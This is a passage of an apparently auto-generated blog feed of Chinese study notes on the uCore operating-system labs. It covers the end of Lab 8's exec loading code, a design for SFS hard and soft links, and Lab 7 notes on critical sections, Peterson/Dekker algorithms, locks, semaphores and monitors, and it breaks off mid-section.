USTACKTOP<span class="number">-3</span>*PGSIZE , PTE_USER) != <span class="literal">NULL</span>);</span><br><span class="line">    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP<span class="number">-4</span>*PGSIZE , PTE_USER) != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    mm_count_inc(mm);</span><br><span class="line">    <span class="comment">// 设置CR3页表相关寄存器</span></span><br><span class="line">    current-&gt;mm = mm;</span><br><span class="line">    current-&gt;cr3 = PADDR(mm-&gt;pgdir);</span><br><span class="line">    lcr3(PADDR(mm-&gt;pgdir));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//setup argc, argv</span></span><br><span class="line">    <span class="comment">// LAB8 设置execve所启动的程序参数</span></span><br><span class="line">    <span class="keyword">uint32_t</span> argv_size=<span class="number">0</span>, i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; argc; i ++) &#123;</span><br><span class="line">        argv_size += strnlen(kargv[i],EXEC_MAX_ARG_LEN + <span class="number">1</span>)+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uintptr_t</span> stacktop = USTACKTOP - (argv_size/<span class="keyword">sizeof</span>(<span class="keyword">long</span>)+<span class="number">1</span>)*<span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line">    <span class="comment">// 直接将传入的参数压入至新栈的底部</span></span><br><span class="line">    <span class="keyword">char</span>** uargv=(<span class="keyword">char</span> **)(stacktop  - argc * <span class="keyword">sizeof</span>(<span class="keyword">char</span> *));</span><br><span class="line"></span><br><span class="line">    argv_size = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; argc; i ++) &#123;</span><br><span class="line">        uargv[i] = <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)(stacktop + argv_size ), kargv[i]);</span><br><span class="line">        argv_size +=  strnlen(kargv[i],EXEC_MAX_ARG_LEN + <span class="number">1</span>)+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    stacktop = (<span class="keyword">uintptr_t</span>)uargv - <span class="keyword">sizeof</span>(<span class="keyword">int</span>);</span><br><span class="line">    *(<span class="keyword">int</span> *)stacktop = argc;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">tf</span> = <span class="title">current</span>-&gt;<span class="title">tf</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(tf, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct trapframe));</span><br><span class="line">    tf-&gt;tf_cs = USER_CS;</span><br><span class="line">    tf-&gt;tf_ds = tf-&gt;tf_es = tf-&gt;tf_ss = USER_DS;</span><br><span class="line">    tf-&gt;tf_esp = stacktop;</span><br><span class="line">    tf-&gt;tf_eip = elf-&gt;e_entry;</span><br><span class="line">    tf-&gt;tf_eflags = FL_IF;</span><br><span class="line">    ret = <span class="number">0</span>;</span><br><span class="line">out:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">bad_cleanup_mmap:</span><br><span class="line">    exit_mmap(mm);</span><br><span class="line">bad_elf_cleanup_pgdir:</span><br><span class="line">    put_pgdir(mm);</span><br><span class="line">bad_pgdir_cleanup_mm:</span><br><span class="line">    mm_destroy(mm);</span><br><span class="line">bad_mm:</span><br><span class="line">    <span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<blockquote>
<p>给出设计实现基于”<strong>UNIX的硬链接和软链接机制</strong>“的概要设方案</p>
</blockquote>
<ul>
<li>
<p>SFS中已经预留出硬链接/软链接的相关定义（没有实现）</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * VFS layer high-level operations on pathnames</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *    vfs_link         - Create a hard link to a file.</span></span><br><span class="line"><span class="comment"> *    vfs_symlink      - Create a symlink PATH containing contents CONTENTS.</span></span><br><span class="line"><span class="comment"> *    vfs_unlink       - Delete a file/directory.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_link</span><span class="params">(<span class="keyword">char</span> *old_path, <span class="keyword">char</span> *new_path)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_symlink</span><span class="params">(<span class="keyword">char</span> *old_path, <span class="keyword">char</span> *new_path)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_unlink</span><span class="params">(<span class="keyword">char</span> *path)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>硬链接机制的实现</p>
<ul>
<li>创建硬链接时，仍然为<code>new_path</code>建立一个<code>sfs_disk_entry</code>结构，但该结构的内部<code>ino</code>成员指向<code>old_path</code>的磁盘索引结点，并使该磁盘索引节点的<code>nlinks</code>引用计数成员加一即可。</li>
<li>删除硬链接时，令对应磁盘结点<code>sfs_disk_inode</code>中的<code>nlinks</code>减一，同时删除硬链接的<code>sfs_disk_entry</code>结构即可。</li>
</ul>
</li>
<li>
<p>软链接的实现</p>
<ul>
<li>
<p>与创建硬链接不同，创建软链接时要多建立一个<code>sfs_disk_inode</code>结构（即建立一个全新的文件）。之后，将<code>old_path</code>写入该文件中，并标注<code>sfs_disk_inode</code>的<code>type</code>为<code>SFS_TYPE_LINK</code>即可。</p>
</li>
<li>
<p>删除软链接与删除文件的操作没有区别，直接将对应的<code>sfs_disk_entry</code>和<code>sfs_disk_inode</code>结构删除即可。</p>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>天问之路</category>
      </categories>
      <tags>
        <tag>uCore</tag>
        <tag>OS</tag>
      </tags>
  </entry>
  <entry>
    <title>uCore实验 - Lab7</title>
    <url>/2020/09/uCore-7/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<ul>
<li>这里是笔者在完成<code>uCore</code> Lab 7时写下的一些笔记</li>
<li>内容涉及信号、管程、死锁和进程通信的一些相关实现。</li>
</ul>
<a id="more"></a>
<h2 id="知识点">知识点</h2>
<h3 id="1-原子操作（Atomic-Operator）">1. 原子操作（Atomic Operator）</h3>
<ul>
<li>
<p>原子操作是指一次不存在任何中断或失效的操作</p>
</li>
<li>
<p>该操作只有两种情况</p>
<ul>
<li>操作<strong>成功执行</strong></li>
<li>操作<strong>没有执行</strong></li>
</ul>
<blockquote>
<p><strong>不存在</strong>出现<strong>部分执行</strong>的情况</p>
</blockquote>
<ul>
<li>操作系统需要利用同步机制在并发执行的同时，保存一些操作是原子操作。</li>
</ul>
</li>
</ul>
<h3 id="2-进程的交互关系">2. 进程的交互关系</h3>
<hr>
<table>
<thead>
<tr>
<th style="text-align:center">相互感知的程度</th>
<th style="text-align:center">交互关系</th>
<th style="text-align:center">进程间的影响</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">相互不感知（完全不了解其他进程的存在）</td>
<td style="text-align:center">独立</td>
<td style="text-align:center">一个进程的操作对其他进程的结果无影响</td>
</tr>
<tr>
<td style="text-align:center">间接感知（双方都与第三方交互，例如数据共享）</td>
<td style="text-align:center">通过共享进行协作</td>
<td style="text-align:center">一个进程的结果依赖于共享资源的状态</td>
</tr>
<tr>
<td style="text-align:center">直接感知（双方直接交互，例如通信）</td>
<td style="text-align:center">通过通信进行协作</td>
<td style="text-align:center">一个进程的结果依赖于从其他进程获得的信息</td>
</tr>
</tbody>
</table>
<p>进程之间可能出现三种关系：</p>
<ul>
<li>互斥（mutual exclusion）：一个进程占用资源，<strong>其他进程不能使用</strong></li>
<li>死锁（deadlock）：多个进程占用部分资源，形成<strong>循环等待</strong></li>
<li>饥饿（starvation）：其他进程可能轮流占用资源，一个进程<strong>一直得不到资源</strong></li>
</ul>
<h3 id="3-临界区">3. 临界区</h3>
<h4 id="a-相关区域的概念">a. 相关区域的概念</h4>
<ul>
<li>临界区（critical section）：进程中访问临界资源的一段需要互斥执行的代码。</li>
<li>进入区（entry section）：检查可否进入临界区的一段代码。如果可以进入，则设置“<strong>正在访问临界区</strong>”标志</li>
<li>退出区（exit section）: 清除标志</li>
<li>剩余区（remainder section）: 代码中的其余部分</li>
</ul>
<h4 id="b-临界区的访问规则">b. 临界区的访问规则</h4>
<p>空闲则入、忙则等待、有限等待、让权等待（可选）</p>
<blockquote>
<p>让权等待：让不能进入临界区的进程暂时释放CPU资源。</p>
</blockquote>
<h4 id="c-临界区的实现方法">c. 临界区的实现方法</h4>
<h5 id="1-禁用中断">1) 禁用中断</h5>
<ul>
<li>
<p>无中断，无上下文切换，因此无并发</p>
<ul>
<li>
<p>硬件将中断处理延迟到中断被启用之后</p>
</li>
<li>
<p>现代计算机体系结构都提供指令来实现禁用中断。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">local_irq_save(<span class="keyword">unsigned</span> <span class="keyword">long</span> flags);</span><br><span class="line">critical_section</span><br><span class="line">local_irq_restore(<span class="keyword">unsigned</span> <span class="keyword">long</span> flags);</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p>进入临界区：禁止所有中断，并保存标志</p>
</li>
<li>
<p>离开临界区：使能所有中断，并恢复标志</p>
</li>
<li>
<p>缺点</p>
<ul>
<li>
<p>禁用中断后，<strong>进程无法被停止</strong></p>
<ul>
<li>整个系统都会因此停下</li>
<li>可能导致其他进程处于饥饿状态</li>
</ul>
</li>
<li>
<p>临界区可能很长，<strong>无法确定响应中断所需的时间</strong></p>
</li>
<li>
<p>仅限于<strong>单处理器</strong></p>
</li>
</ul>
</li>
</ul>
<h5 id="2-基于软件的同步解决方法">2) 基于软件的同步解决方法</h5>
<p><strong>线程可通过共享一些共有变量来同步它们的行为</strong>。</p>
<ul>
<li>
<p>Peterson算法（两线程之间的同步互斥算法）</p>
<ul>
<li>
<p>共享变量</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> turn; <span class="comment">// 表示该谁进入临界区</span></span><br><span class="line"><span class="keyword">bool</span> flag[]; <span class="comment">// 表示进程是否准备好进入临界区</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>进入区代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置当前线程想进入临界区</span></span><br><span class="line">flag[i] = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">// 先让另一个进程执行</span></span><br><span class="line">turn = j;</span><br><span class="line"><span class="comment">// 如果另一个进程想进入同时也可进入临界区，则当前进程等待</span></span><br><span class="line"><span class="keyword">while</span>(flag[j] &amp;&amp; turn == j)</span><br><span class="line">    ;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>退出区代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置当前线程不想进入临界区</span></span><br><span class="line">flag[i] = <span class="literal">false</span>;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>总结</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 线程Ti的代码</span></span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    <span class="comment">// 设置当前线程想进入临界区</span></span><br><span class="line">    flag[i] = <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">// 先让另一个进程执行</span></span><br><span class="line">    turn = j;</span><br><span class="line">    <span class="comment">// 如果另一个进程想进入同时也可进入临界区，则当前进程等待</span></span><br><span class="line">    <span class="keyword">while</span>(flag[j] &amp;&amp; turn == j)</span><br><span class="line">        ;<span class="comment">// 忙等待</span></span><br><span class="line"></span><br><span class="line">    CRITICAL SECTION</span><br><span class="line"></span><br><span class="line">    flag[i] = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    REMAINDER SECTION</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">while</span>(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p>Dekkers算法。逻辑与Peterson类似，为另一种的两线程之间的同步互斥算法。所不同的是<strong>这个算法可以很方便的扩展至多个线程</strong>。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 线程Ti的代码</span></span><br><span class="line">flag[<span class="number">0</span>] = flag[<span class="number">1</span>] = <span class="literal">false</span>;</span><br><span class="line">turn = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    <span class="comment">// 设置当前进程想进入临界区</span></span><br><span class="line">    flag[i] = <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">// 如果上一个进程想进入临界区，则先让它进</span></span><br><span class="line">    <span class="keyword">while</span>(flag[j] == <span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 如果目前轮到的进程不是当前进程</span></span><br><span class="line">        <span class="keyword">if</span>(turn != i)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 则取消进入临界区的标记</span></span><br><span class="line">            flag[i] = <span class="literal">false</span>;</span><br><span class="line">            <span class="comment">// 并等待轮到当前进程</span></span><br><span class="line">            <span class="keyword">while</span>(turn != i)</span><br><span class="line">                ; <span class="comment">// 忙等待</span></span><br><span class="line">            <span class="comment">// 一旦轮到当前进程，则设置进入临界区的标记</span></span><br><span class="line">            flag[i] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CRITICAL SECTION</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当前进程临界区已经执行完成，轮换至下一个进程</span></span><br><span class="line">    turn = j;</span><br><span class="line">    flag[i] = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    REMAINDER SECTION</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">while</span>(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>N线程的软件方法（Eisenberg和McGuire）</p>
<p><img src="/2020/09/uCore-7/nthreads.png" alt="img"></p>
</li>
<li>
<p>缺点</p>
<ul>
<li>复杂：需要两个进程间的共享数据项</li>
<li>需要忙等待：浪费CPU时间</li>
</ul>
</li>
</ul>
<h5 id="3-更高级的抽象方法">3) 更高级的抽象方法</h5>
<ul>
<li>
<p>硬件提供一些同步原语：例如中断禁用，原子操作指令等</p>
</li>
<li>
<p>操作系统提供更高级的编程抽象来简化进程同步：例如锁、信号量，或者用硬件原语来构造、</p>
</li>
<li>
<p><strong>锁（lock)</strong></p>
<ul>
<li>
<p>锁是一个抽象的数据结构</p>
<ul>
<li>使用一个二进制变量，用于表示锁定/解锁</li>
<li><strong>Lock::Acquire()</strong> : 锁被释放前一直等待，直到得到锁</li>
<li><strong>Lock::Release()</strong> : 释放锁，唤醒任何等待的进程</li>
</ul>
</li>
<li>
<p>使用锁来控制临界区访问</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">lock_next_pid-&gt;Acquire();</span><br><span class="line">next_pid = next_pid++;</span><br><span class="line">lock_next_pid-&gt;Release();</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><strong>原子操作指令</strong></p>
<ul>
<li>
<p>现代CPU体系结构都提供一些特殊的原子操作指令</p>
</li>
<li>
<p>测试和置位（Test-and-Set）指令</p>
<blockquote>
<p>从内存中获取值，测试该值是否为1，并设置内存单元值为1</p>
</blockquote>
<p>等效于：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">TestAndSet</span><span class="params">(<span class="keyword">bool</span> *target)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> ret = *target;</span><br><span class="line">    *target = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>交换指令（exchange）</p>
<blockquote>
<p>交换内存中的两个值</p>
</blockquote>
<p>等效于：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exchange</span><span class="params">(<span class="keyword">bool</span> *a, <span class="keyword">bool</span>* b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> tmp = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = tmp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p>使用TS指令实现自旋锁（spinlock)</p>
<ul>
<li>
<p>自旋忙等待锁</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Lock</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> value = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Acquire</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 如果锁被释放，则读取并设置value为1</span></span><br><span class="line">        <span class="comment">// 如果锁被占用，则一直循环查找</span></span><br><span class="line">        <span class="keyword">while</span>(test-<span class="keyword">and</span>-<span class="built_in">set</span>(value))</span><br><span class="line">            ; <span class="comment">// spin，线程在等待时需要消耗CPU资源</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Release</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        value = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>无忙等待锁（非自旋锁）</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Lock</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> value = <span class="number">0</span>;</span><br><span class="line">    WaitQueue q;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Acquire</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 如果锁被释放，则读取并设置value为1</span></span><br><span class="line">        <span class="comment">// 如果锁被占用，则一直循环查找</span></span><br><span class="line">        <span class="keyword">while</span>(test-<span class="keyword">and</span>-<span class="built_in">set</span>(value))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 当前进程无法获取到锁，进入等待队列</span></span><br><span class="line">            q.push_back(currentThread-&gt;PCB);</span><br><span class="line">            <span class="comment">// 调度至其他线程中运行</span></span><br><span class="line">            schedule();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Release</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        value = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 唤醒等待队列中的线程</span></span><br><span class="line">        PCB&amp; t = q.pop_front();</span><br><span class="line">        wakeup(t);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p>原子操作锁的特征</p>
<ul>
<li>
<p>优点</p>
<ul>
<li>适用于单处理器或者共享主存的多处理器中任意数量的进程同步</li>
<li>简单并容易证明</li>
<li>支持多临界区</li>
</ul>
</li>
<li>
<p>缺点</p>
<ul>
<li>
<p>忙等待消耗处理器时间</p>
</li>
<li>
<p>可能导致饥饿：进程离开临界区时有多个等待进程的情况</p>
</li>
<li>
<p><strong>死锁</strong>：拥有临界区的低优先级进程，以及请求访问临界区的高优先级进程获得处理器并等待临界区。</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="4-信号量">4. 信号量</h3>
<h4 id="a-相关概念">a. 相关概念</h4>
<ul>
<li>
<p>信号量(Semaphore)是操作系统提供的一种协调共享资源访问的方法</p>
<ul>
<li>软件同步是平等线程间的一种同步协商机制</li>
<li>OS是管理者，地位高于进程</li>
<li>用信号量表示系统资源的数量</li>
</ul>
</li>
<li>
<p>信号量是一种抽象数据类型</p>
<ul>
<li>由一个整数（sem）变量和两个原子操作组成</li>
<li><strong>P()</strong> ：<code>sem--</code>，如果sem&lt;0，则进入等待，否则继续</li>
<li><strong>V()</strong> : <code>sem++</code>, 如果sem &lt;= 0, 唤醒一个等待进程</li>
</ul>
</li>
<li>
<p>信号量是被保护的整数变量</p>
<ul>
<li>初始化完成后，只能通过 <strong>P()</strong> 和 <strong>V()</strong> 操作修改</li>
<li>由操作系统来保证，PV操作是<strong>原子操作</strong></li>
</ul>
</li>
<li>
<p>P() 可能阻塞，但 V() 不会阻塞</p>
</li>
<li>
<p>通常，假定信号量是“公平的”</p>
<ul>
<li>
<p>即，线程不会被无限期阻塞在P() 操作中</p>
</li>
<li>
<p>假定信号量等待按先进先出排队</p>
<blockquote>
<p>自旋锁不能实现先进先出</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>信号量的一种实现方式</p>
<blockquote>
<p>与用户自己编写的锁不同，<strong>操作系统保证PV操作是原子操作</strong>。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Semaphore</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> sem;</span><br><span class="line">    WaitQueue q;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">P</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 由于操作系统的保证，修改变量与条件判断之间不可能会出现条件竞争</span></span><br><span class="line">        sem--;</span><br><span class="line">        <span class="keyword">if</span>(sem &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            Add <span class="keyword">this</span> thread t to q;</span><br><span class="line">            block(p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">V</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        sem++;</span><br><span class="line">        <span class="keyword">if</span>(sem &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">            Remove a thread t from q;</span><br><span class="line">            wakeup(t);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="b-信号量的分类">b. 信号量的分类</h4>
<ul>
<li>
<p>信号量可分为两种信号量</p>
<ul>
<li><strong>二进制信号量</strong>，资源数目为0/1</li>
<li><strong>资源信号量</strong>：资源数目为任何非负值</li>
</ul>
<blockquote>
<p>两者等价，基于某一个可以实现另一个</p>
</blockquote>
</li>
<li>
<p>信号量的使用</p>
<ul>
<li>互斥访问：临界区的互斥访问控制</li>
<li>条件同步：线程间的事件等待</li>
</ul>
</li>
<li>
<p>用信号量实现临界区的互斥访问</p>
<ul>
<li>每类资源设置一个信号量，其初值为1</li>
<li>必须成对使用P()和V()操作
<ul>
<li>P()操作保证互斥访问临界资源</li>
<li>V()操作在使用后释放临界资源</li>
<li>PV操作<strong>不能次序颠倒，重复或遗漏q</strong></li>
</ul>
</li>
</ul>
</li>
<li>
<p>缺点</p>
<ul>
<li>读/开发代码较为困难。程序员需要能运用信号量机制</li>
<li>容易出错。使用的信号量已经被另一个线程占用，或者忘记释放信号量</li>
<li>无法处理死锁问题</li>
</ul>
</li>
</ul>
<h5 id="生产者-消费者问题">生产者-消费者问题</h5>
<ul>
<li>
<p>问题描述</p>
<ul>
<li>一个或多个的生产者在生成数据后放在一个缓冲区中</li>
<li>单个消费者从缓冲区取出数据处理</li>
<li>任何时刻只能有一个生产者或消费者可访问该缓冲区</li>
</ul>
</li>
<li>
<p>问题分析</p>
<ul>
<li>任何时刻只能有一个线程操作缓冲区（互斥访问）</li>
<li>缓冲区为空时，消费者必须等待生产者（条件同步）</li>
<li>缓冲区为满时，生产者必须等待消费者（条件同步）</li>
</ul>
</li>
<li>
<p>用信号量描述每个约束</p>
<ul>
<li>二进制信号量mutex</li>
<li>资源信号量<code>fullBuffers</code></li>
<li>资源信号量<code>emptyBuffers</code></li>
</ul>
</li>
<li>
<p>代码解决</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BoundedBuffer</span>&#123;</span></span><br><span class="line">    mutex = <span class="keyword">new</span> Semaphore(<span class="number">1</span>);</span><br><span class="line">    fullBuffers = <span class="keyword">new</span> Semaphore(<span class="number">0</span>);</span><br><span class="line">    emptyBuffers = <span class="keyword">new</span> Semaphore(n);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Deposit</span><span class="params">(c)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 占用当前的空闲缓冲区（如果当前缓冲区已满，则挂起）</span></span><br><span class="line">        emptyBuffers-&gt;P();</span><br><span class="line">        <span class="comment">// 独占当前缓冲区（如果当前缓冲区正在被使用，则挂起）</span></span><br><span class="line">        mutext-&gt;P();</span><br><span class="line">        Add c to the buffer;</span><br><span class="line">        <span class="comment">// 释放当前缓冲区的占用</span></span><br><span class="line">        mutext-&gt;V();</span><br><span class="line">        <span class="comment">// 由于向缓冲区中写入了数据，所以增加满缓冲区的资源数</span></span><br><span class="line">        fullBuffers-&gt;V();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Remove</span><span class="params">(c)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        fullBuffers-&gt;P();</span><br><span class="line">        mutext-&gt;P();</span><br><span class="line">        remove c from the buffer;</span><br><span class="line">        mutext-&gt;V();</span><br><span class="line">        emptyBuffers-&gt;V();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要注意的是，<strong>PV操作的顺序一定要对应</strong>，否则可能出现<strong>死锁</strong>情况！</p>
</li>
</ul>
<h3 id="5-管程">5. 管程</h3>
<h4 id="a-相关概念-2">a. 相关概念</h4>
<ul>
<li>管程（Monitor）是一种用于多线程互斥访问共享资源的程序结构
<ul>
<li>采用面向对象方法，简化了线程间的同步控制</li>
<li>任一时刻最多只有一个线程执行管程代码</li>
<li><strong>正在管程中的线程可临时放弃管程的互斥访问，等待事件出现时恢复</strong></li>
</ul>
</li>
<li>管程的使用
<ul>
<li>在对象/模块中，收集相关共享数据</li>
<li>定义访问共享数据的方法</li>
</ul>
</li>
<li>管程的组成
<ul>
<li>一个锁，控制管程代码的互斥访问</li>
<li>0-n个条件变量，用于管理共享数据的并发访问</li>
</ul>
</li>
<li>引入管程机制的目的：
<ul>
<li>把分散在各进程中的临界区集中起来进行管理</li>
<li>防止进程有意或无意的违法同步操作</li>
<li>便于用高级语言来书写程序，也便于程序正确性验证。</li>
</ul>
</li>
</ul>
<h4 id="b-条件变量">b. 条件变量</h4>
<ul>
<li>
<p>条件变量（Condition Variable）是管程内的等待机制</p>
<ul>
<li>进入管程的线程因资源被占用而进入等待状态</li>
<li>每个条件变量表示一种等待原因，对应一个等待队列</li>
</ul>
</li>
<li>
<p><strong>Wait()</strong> 操作</p>
<ul>
<li>将自己阻塞在等待队列中</li>
<li>唤醒一个等待者或释放管程的互斥访问</li>
</ul>
</li>
<li>
<p><strong>Signal()</strong> 操作</p>
<ul>
<li>将等待队列中的一个线程唤醒</li>
<li>如果等待队列为空，则等同空操作</li>
</ul>
</li>
<li>
<p>用<strong>条件变量</strong>来解决生产者-消费者问题</p>
<blockquote>
<p>该部分代码请结合“用管程解决生产者-消费者问题”理解</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Condition</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> numWaiting = <span class="number">0</span>;</span><br><span class="line">    WaitQueue q;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Wait</span><span class="params">(lock)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        numWaiting++;</span><br><span class="line">        add <span class="keyword">this</span> thread t to q;</span><br><span class="line">        release(lock);  <span class="comment">// 释放原先占有的锁</span></span><br><span class="line">        schedule(); <span class="comment">// need mutex</span></span><br><span class="line">        require(lock); <span class="comment">// 获取原先被释放的锁</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Signal</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(numWaiting &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Release a thread t from q;</span><br><span class="line">            wakeup(t);</span><br><span class="line">            numWaiting--;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>用<strong>管程</strong>解决生产者-消费者问题</p>
